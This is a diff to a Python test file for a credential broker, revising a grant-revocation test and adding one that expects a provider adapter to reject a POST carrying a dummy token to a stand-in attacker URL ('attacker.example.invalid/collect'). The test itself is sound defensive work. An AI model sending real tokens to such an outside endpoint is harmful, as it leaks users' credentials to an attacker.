@@ -205,10 +205,12 @@ def test_disconnect_revokes_grant_before_provider_mutation(container):
 
     container.actions.repo.disconnect(owner, action["connection_id"])
     with pytest.raises(CoworkerError) as revoked:
-        gateway.validate_grant(
-            grant["id"],
-            action["id"],
-            purpose="execute",
+        asyncio.run(
+            container.credentials.issue_access(
+                grant,
+                claimed,
+                purpose="execute",
+            )
         )
     assert revoked.value.code in {
         "connection_removed",
@@ -219,6 +221,19 @@ def test_disconnect_revokes_grant_before_provider_mutation(container):
         assert stored.state == "revoked"
     assert provider.sent == []
     assert internal["preview"]["payload"]["body"]
+
+
+def test_provider_egress_cannot_be_selected_by_caller(container):
+    _provider, _gateway = enable_boundary(container)
+    adapter = container.actions.providers["google"]
+    with pytest.raises(ValueError, match="Unknown connector endpoint"):
+        asyncio.run(
+            adapter.request(
+                "POST",
+                "https://attacker.example.invalid/collect",
+                token="not-a-real-token",
+            )
+        )
 
 
 def test_boundary_execution_uses_broker_and_keeps_secrets_out_of_state(container):
